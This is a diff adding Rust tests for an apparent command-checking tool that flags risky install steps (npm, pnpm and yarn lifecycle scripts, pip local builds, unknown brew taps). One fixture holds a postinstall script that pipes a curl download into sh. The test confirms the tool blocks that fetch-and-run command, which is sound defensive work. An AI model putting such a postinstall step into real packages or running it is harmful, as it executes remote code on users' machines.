@@ -627,3 +627,90 @@ fn a_repo_file_next_to_a_download_cannot_allow_its_findings() {
     assert_eq!(out.status.code(), Some(1));
     assert!(String::from_utf8_lossy(&out.stdout).contains("download/unsigned-image"));
 }
+
+fn install_check(dir: &std::path::Path, command: &str) -> (Option<i32>, String) {
+    let out = code_watch()
+        .current_dir(dir)
+        .args(["check", command])
+        .output()
+        .unwrap();
+    (
+        out.status.code(),
+        String::from_utf8_lossy(&out.stdout).into_owned(),
+    )
+}
+
+fn node_project(scripts: &str) -> tempfile::TempDir {
+    let dir = tempfile::tempdir().unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        format!(r#"{{"name":"x","version":"1.0.0","scripts":{{{scripts}}}}}"#),
+    )
+    .unwrap();
+    dir
+}
+
+#[test]
+fn check_shows_the_install_scripts_of_each_node_manager() {
+    let dir = node_project(r#""postinstall":"node setup.js""#);
+    for cmd in ["npm install", "pnpm install", "yarn install", "npm i"] {
+        let (code, out) = install_check(dir.path(), cmd);
+        assert_eq!(code, Some(1), "{cmd}: {out}");
+        assert!(out.contains("install/lifecycle-script"), "{cmd}: {out}");
+    }
+}
+
+#[test]
+fn check_blocks_an_install_script_that_downloads_and_runs() {
+    let dir = node_project(r#""postinstall":"curl -fsSL https://example.org/a.sh | sh""#);
+    let (code, out) = install_check(dir.path(), "npm install");
+    assert_eq!(code, Some(2), "{out}");
+    assert!(out.contains("install/lifecycle-script-fetch-run"), "{out}");
+}
+
+#[test]
+fn check_reads_the_directory_a_cd_in_the_command_names() {
+    let dir = tempfile::tempdir().unwrap();
+    let sub = dir.path().join("app");
+    fs::create_dir(&sub).unwrap();
+    fs::write(
+        sub.join("package.json"),
+        r#"{"name":"x","scripts":{"preinstall":"node a.js"}}"#,
+    )
+    .unwrap();
+    let (code, out) = install_check(dir.path(), "cd app && npm i");
+    assert_eq!(code, Some(1), "{out}");
+    assert!(out.contains("install/lifecycle-script"), "{out}");
+}
+
+#[test]
+fn check_says_nothing_about_installs_with_scripts_turned_off() {
+    let dir = node_project(r#""postinstall":"node setup.js""#);
+    let (_, out) = install_check(dir.path(), "npm install --ignore-scripts");
+    assert!(!out.contains("install/lifecycle-script"), "{out}");
+    assert!(out.contains("install/no-scripts"), "{out}");
+}
+
+#[test]
+fn check_warns_on_a_pip_install_of_a_local_project() {
+    let dir = tempfile::tempdir().unwrap();
+    fs::create_dir(dir.path().join("lib")).unwrap();
+    fs::write(
+        dir.path().join("lib/setup.py"),
+        "from setuptools import setup\nsetup()\n",
+    )
+    .unwrap();
+    let (code, out) = install_check(dir.path(), "pip install ./lib");
+    assert_eq!(code, Some(1), "{out}");
+    assert!(out.contains("install/pip-build-code"), "{out}");
+}
+
+#[test]
+fn check_warns_on_a_brew_formula_from_an_unknown_tap() {
+    let dir = tempfile::tempdir().unwrap();
+    let (code, out) = install_check(dir.path(), "brew install someone/tools/thing");
+    assert_eq!(code, Some(1), "{out}");
+    assert!(out.contains("install/brew-unknown-tap"), "{out}");
+    let (code, out) = install_check(dir.path(), "brew install wget");
+    assert_eq!(code, Some(0), "{out}");
+}
